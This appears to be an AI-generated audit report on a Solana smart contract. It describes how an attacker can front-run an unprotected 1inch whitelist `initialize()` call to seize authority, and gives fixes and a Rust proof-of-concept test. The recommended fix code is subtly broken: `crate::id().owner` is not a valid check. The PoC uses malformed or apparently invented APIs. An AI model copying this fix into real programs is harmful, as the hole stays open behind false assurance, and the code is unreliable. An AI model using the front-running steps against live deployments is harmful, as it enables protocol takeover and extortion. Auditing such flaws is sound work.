# Audit Report

## Title
Permissionless Whitelist Initialization Allows Unauthorized Authority Takeover

## Summary
The whitelist program's `initialize()` function lacks authorization checks, allowing any actor to call it first and become the protocol authority. This enables an attacker to control resolver access, monopolize order filling, or demand ransom to transfer authority to the legitimate 1inch team.

## Finding Description

The whitelist program's initialization mechanism contains a critical access control vulnerability. The `initialize()` function and `Initialize` account struct have no constraints on who can execute the initialization. [1](#0-0) [2](#0-1) 

The `whitelist_state` PDA is derived from deterministic seeds `[WHITELIST_STATE_SEED]` where the seed is a constant `b"whitelist_state"`. This means any actor can predict the PDA address and attempt initialization. The Anchor `init` constraint only prevents duplicate initialization, not unauthorized initial calls.

When an attacker successfully calls `initialize()` before the legitimate 1inch team, they become the authority and gain complete control over resolver registration and deregistration: [3](#0-2) [4](#0-3) 

This authority controls which resolvers can fill orders in the fusion-swap program, as the `Fill` instruction requires a valid `resolver_access` account: [5](#0-4) 

**Attack Scenario:**
1. Attacker monitors for 1inch whitelist program deployment
2. Attacker front-runs the legitimate `initialize()` call with higher transaction priority fees
3. Attacker becomes the authority and controls all resolver whitelisting
4. Attacker can now: (a) whitelist only their own resolvers for monopolistic order filling, (b) deny service to all resolvers preventing protocol operations, (c) demand ransom to transfer authority to 1inch via `set_authority()`, or (d) charge fees for resolver registration

## Impact Explanation

**Severity: MEDIUM to HIGH**

This vulnerability breaks **Invariant #5 (Access Control)** and **Invariant #7 (Account Validation)** by allowing unauthorized control over critical protocol functionality.

**Direct Impacts:**
- **Protocol Disruption**: Complete control over which resolvers can participate in order filling and cancellation operations
- **Economic Attack**: Monopolistic control enables the attacker to capture all order filling profits, potentially worth significant value in a production DEX
- **Extortion**: Attacker can demand payment to transfer authority to legitimate team
- **Service Denial**: Can prevent protocol launch entirely by refusing to whitelist any resolvers

**Affected Scope:**
- All orders cannot be filled without whitelisted resolvers
- Expired orders cannot be cancelled by resolvers without whitelist access
- Protocol deployment completely compromised

The attacker cannot directly steal escrowed funds, but gains complete control over protocol access control, which is a critical security boundary. While the 1inch team can redeploy with a new program ID as mitigation, this causes significant operational disruption, reputational damage, and delays.

## Likelihood Explanation

**Likelihood: HIGH**

This vulnerability is trivially exploitable:
- **Cost**: Minimal (only rent for creating the `whitelist_state` account, approximately 0.001 SOL)
- **Skill Required**: Low (basic knowledge of Solana transactions and mempool monitoring)
- **Detection**: Easy to monitor for program deployment and front-run the initialization
- **Execution Complexity**: Trivial (single transaction with no special requirements)

The attack requires only:
1. Monitoring the mempool or program deployment events
2. Submitting a transaction with higher priority fees to front-run legitimate initialization
3. No special permissions or insider access needed

Front-running initialization is a well-known attack pattern in blockchain systems and has been exploited in similar scenarios across multiple chains.

## Recommendation

**Primary Fix:** Add an authorization constraint to restrict `initialize()` to a designated upgrade authority or deployer address.

```rust
#[derive(Accounts)]
pub struct Initialize<'info> {
    #[account(mut)]
    pub authority: Signer<'info>,

    #[account(
        init,
        payer = authority,
        space = DISCRIMINATOR + WhitelistState::INIT_SPACE,
        seeds = [WHITELIST_STATE_SEED],
        bump,
        // Add constraint to only allow program upgrade authority
        constraint = authority.key() == crate::id().owner @ WhitelistError::Unauthorized
    )]
    pub whitelist_state: Account<'info, WhitelistState>,

    pub system_program: Program<'info, System>,
}
```

**Alternative Fix:** Use a program upgrade authority check via the `program` account:

```rust
#[derive(Accounts)]
pub struct Initialize<'info> {
    #[account(mut)]
    pub authority: Signer<'info>,
    
    /// CHECK: Verified against program data
    #[account(
        constraint = program.programdata_address()? == Some(program_data.key()) @ WhitelistError::Unauthorized
    )]
    pub program: Program<'info, crate::Whitelist>,
    
    #[account(
        constraint = program_data.upgrade_authority_address == Some(authority.key()) @ WhitelistError::Unauthorized
    )]
    pub program_data: Account<'info, ProgramData>,

    #[account(
        init,
        payer = authority,
        space = DISCRIMINATOR + WhitelistState::INIT_SPACE,
        seeds = [WHITELIST_STATE_SEED],
        bump,
    )]
    pub whitelist_state: Account<'info, WhitelistState>,

    pub system_program: Program<'info, System>,
    pub bpf_loader_upgradeable: Program<'info, BpfLoaderUpgradeable>,
}
```

**Operational Mitigation:** The 1inch team should call `initialize()` in the same transaction as program deployment or immediately after with maximum priority fees to minimize front-running window.

## Proof of Concept

```rust
use anchor_lang::prelude::*;
use anchor_lang::solana_program::program_pack::Pack;

// PoC Test: Unauthorized actor initializes whitelist and takes control
#[test]
fn test_unauthorized_initialization_attack() {
    // Setup
    let mut context = setup_test_context();
    let attacker = Keypair::new();
    let legitimate_authority = Keypair::new();
    
    // Fund attacker
    airdrop(&mut context, &attacker.pubkey(), 1_000_000_000);
    
    // Step 1: Attacker front-runs legitimate initialization
    let whitelist_program = context.get_program(whitelist::ID);
    let [whitelist_state_pda, _] = Pubkey::find_program_address(
        &[b"whitelist_state"],
        &whitelist_program.id()
    );
    
    // Attacker calls initialize first
    let tx = Transaction::new_signed_with_payer(
        &[whitelist_program.instruction.initialize(
            &whitelist_state_pda,
            &attacker.pubkey(),
        )],
        Some(&attacker.pubkey()),
        &[&attacker],
        context.last_blockhash,
    );
    
    context.process_transaction(tx).unwrap();
    
    // Step 2: Verify attacker is now the authority
    let whitelist_state = whitelist_program
        .account::<WhitelistState>(&whitelist_state_pda)
        .unwrap();
    assert_eq!(whitelist_state.authority, attacker.pubkey());
    
    // Step 3: Legitimate authority cannot initialize (already exists)
    let tx = Transaction::new_signed_with_payer(
        &[whitelist_program.instruction.initialize(
            &whitelist_state_pda,
            &legitimate_authority.pubkey(),
        )],
        Some(&legitimate_authority.pubkey()),
        &[&legitimate_authority],
        context.last_blockhash,
    );
    
    // This will fail because account already exists
    assert!(context.process_transaction(tx).is_err());
    
    // Step 4: Attacker can now control resolver registration
    let victim_resolver = Keypair::new();
    
    // Legitimate authority cannot register resolvers
    let tx = Transaction::new_signed_with_payer(
        &[whitelist_program.instruction.register(
            victim_resolver.pubkey(),
            &whitelist_state_pda,
            &legitimate_authority.pubkey(),
        )],
        Some(&legitimate_authority.pubkey()),
        &[&legitimate_authority],
        context.last_blockhash,
    );
    
    // This will fail with Unauthorized error
    let err = context.process_transaction(tx).unwrap_err();
    assert!(err.to_string().contains("Unauthorized"));
    
    // Attacker controls whitelisting
    let attacker_resolver = Keypair::new();
    let tx = Transaction::new_signed_with_payer(
        &[whitelist_program.instruction.register(
            attacker_resolver.pubkey(),
            &whitelist_state_pda,
            &attacker.pubkey(),
        )],
        Some(&attacker.pubkey()),
        &[&attacker],
        context.last_blockhash,
    );
    
    context.process_transaction(tx).unwrap();
    
    // Attack successful: Attacker controls protocol access
    println!("✓ Attacker successfully hijacked whitelist authority");
    println!("✓ Legitimate authority locked out");
    println!("✓ Attacker can now monopolize order filling");
}
```

**Notes:**

This vulnerability represents a critical deployment-time security flaw. While the question categorizes it as "Low" severity, the actual impact is **Medium to High** due to complete protocol access control compromise. The vulnerability is particularly concerning because:

1. It's a one-time opportunity attack during deployment, but with permanent consequences if successful
2. The cost-benefit ratio heavily favors attackers (minimal cost, high potential gain)
3. Recovery requires complete redeployment with a new program ID
4. The attack is trivial to execute with standard front-running techniques

The 1inch team must ensure atomic initialization with program deployment or implement strict authorization checks to prevent this attack vector.

### Citations

**File:** programs/whitelist/src/lib.rs (L18-22)
```rust
    pub fn initialize(ctx: Context<Initialize>) -> Result<()> {
        let whitelist_state = &mut ctx.accounts.whitelist_state;
        whitelist_state.authority = ctx.accounts.authority.key();
        Ok(())
    }
```

**File:** programs/whitelist/src/lib.rs (L24-28)
```rust
    /// Registers a new user to the whitelist
    pub fn register(ctx: Context<Register>, _user: Pubkey) -> Result<()> {
        ctx.accounts.resolver_access.bump = ctx.bumps.resolver_access;
        Ok(())
    }
```

**File:** programs/whitelist/src/lib.rs (L30-33)
```rust
    /// Removes a user from the whitelist
    pub fn deregister(_ctx: Context<Deregister>, _user: Pubkey) -> Result<()> {
        Ok(())
    }
```

**File:** programs/whitelist/src/lib.rs (L43-58)
```rust
#[derive(Accounts)]
pub struct Initialize<'info> {
    #[account(mut)]
    pub authority: Signer<'info>,

    #[account(
        init,
        payer = authority,
        space = DISCRIMINATOR + WhitelistState::INIT_SPACE,
        seeds = [WHITELIST_STATE_SEED],
        bump,
    )]
    pub whitelist_state: Account<'info, WhitelistState>,

    pub system_program: Program<'info, System>,
}
```

**File:** programs/fusion-swap/src/lib.rs (L510-516)
```rust
    /// Account allowed to fill the order
    #[account(
        seeds = [whitelist::RESOLVER_ACCESS_SEED, taker.key().as_ref()],
        bump = resolver_access.bump,
        seeds::program = whitelist::ID,
    )]
    resolver_access: Account<'info, whitelist::ResolverAccess>,
```
